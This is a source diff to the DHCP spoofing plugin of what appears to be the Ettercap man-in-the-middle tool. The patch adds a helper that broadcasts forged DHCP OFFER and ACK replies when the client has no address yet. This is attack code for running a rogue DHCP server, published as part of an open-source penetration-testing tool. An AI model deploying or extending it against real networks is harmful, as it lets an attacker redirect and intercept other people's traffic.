@@ -17,7 +17,7 @@
     along with this program; if not, write to the Free Software
     Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 
-    $Id: ec_dhcp_spoofing.c,v 1.9 2004/06/25 14:24:29 alor Exp $
+    $Id: ec_dhcp_spoofing.c,v 1.10 2005/05/28 11:06:46 lordnaga Exp $
 */
 
 #include <ec.h>
@@ -46,6 +46,7 @@ static void dhcp_spoofing_stop(void);
 static void dhcp_spoofing_req(struct packet_object *po);
 static void dhcp_spoofing_disc(struct packet_object *po);
 static void dhcp_setup_options(void);
+static struct ip_addr *dhcp_addr_reply(struct ip_addr *radd);
 
 /* from dissectors/ec_dhcp.c */
 extern u_int8 * get_dhcp_option(u_int8 opt, u_int8 *ptr, u_int8 *end);
@@ -158,6 +159,25 @@ static void dhcp_spoofing_stop(void)
 
 }
 
+
+/* 
+ * Find the right address to reply
+ */
+static struct ip_addr *dhcp_addr_reply(struct ip_addr *radd)
+{
+   static struct ip_addr broad_addr;
+   u_int32 broad_int32 = 0xffffffff;
+   
+   ip_addr_init(&broad_addr, AF_INET, (u_char *)&broad_int32);
+   
+   /* check if the source is 0.0.0.0 */
+   if ( ip_addr_is_zero(radd) )
+      return &broad_addr;
+      
+   return radd;
+}
+
+
 /*
  * parses the request and send the spoofed reply
  */
@@ -220,7 +240,7 @@ static void dhcp_spoofing_req(struct packet_object *po)
       /* set it in the options */
       ip_addr_cpy(dhcp_options + 5, &server);
    
-      send_dhcp_reply(&server, &po->L3.src, po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
+      send_dhcp_reply(&server, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
       
    } else {
       /* 
@@ -232,7 +252,7 @@ static void dhcp_spoofing_req(struct packet_object *po)
       /* set it in the options */
       ip_addr_cpy(dhcp_options + 5, &GBL_IFACE->ip);
    
-      send_dhcp_reply(&GBL_IFACE->ip, &po->L3.src, po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
+      send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
    }
 
    USER_MSG("DHCP spoofing: fake ACK [%s] ", mac_addr_ntoa(po->L2.src, tmp));
@@ -275,7 +295,7 @@ static void dhcp_spoofing_disc(struct packet_object *po)
    ip_addr_cpy(dhcp_options + 5, &GBL_IFACE->ip);
    
    /* send the packet */
-   send_dhcp_reply(&GBL_IFACE->ip, &po->L3.src, po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
+   send_dhcp_reply(&GBL_IFACE->ip, dhcp_addr_reply(&po->L3.src), po->L2.src, dhcp_hdr, dhcp_options, dhcp_optlen);
    
    USER_MSG("DHCP spoofing: fake OFFER [%s] ", mac_addr_ntoa(po->L2.src, tmp));
    USER_MSG("offering %s \n", ip_addr_ntoa(&dhcp_free_ip->ip, tmp));
